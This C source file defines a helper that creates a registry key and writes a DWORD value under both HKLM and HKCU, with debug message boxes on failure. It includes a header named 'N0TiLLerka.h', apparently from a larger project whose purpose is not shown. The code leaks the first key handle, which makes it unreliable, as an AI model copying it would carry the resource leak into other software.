#include "../../../HeaderFiles/N0TiLLerka.h"

bool CreateRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, DWORD dwValue) {
	bool returnvalHKLM, returnvalHKCU;

	HKEY hKey;
	if (!RegCreateKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKey, NULL)) {
		if (!RegSetValueEx(hKey, lpValueName, 0, dwType, (BYTE*)& dwValue, sizeof(DWORD))) {
			returnvalHKLM = TRUE;
		} else {
#ifdef DEBUG
			MessageBox(NULL, L"Couldn't set Registry Type/Value", L"RegSetValueExW", MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
#endif
			returnvalHKLM = FALSE;
		}
	} else {
#ifdef DEBUG
		MessageBox(NULL, L"Couldn't create Registry Key", L"RegCreateKeyExW", MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
#endif
		returnvalHKLM = FALSE;
	}

	hKey = NULL;
	if (!RegCreateKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKey, NULL)) {
		if (!RegSetValueEx(hKey, lpValueName, 0, dwType, (BYTE*)& dwValue, sizeof(DWORD))) {
			returnvalHKCU = TRUE;
		} else {
#ifdef DEBUG
			MessageBox(NULL, L"Couldn't set Registry Type/Value", L"RegSetValueExW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
			returnvalHKCU = FALSE;
		}
	} else {
#ifdef DEBUG
		MessageBox(NULL, L"Couldn't create Registry Key", L"RegCreateKeyExW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
		returnvalHKCU = FALSE;
	}

	RegCloseKey(hKey);
	if (returnvalHKLM == TRUE || returnvalHKCU == TRUE) {
		return TRUE;
	} else {
		return FALSE;
	}
}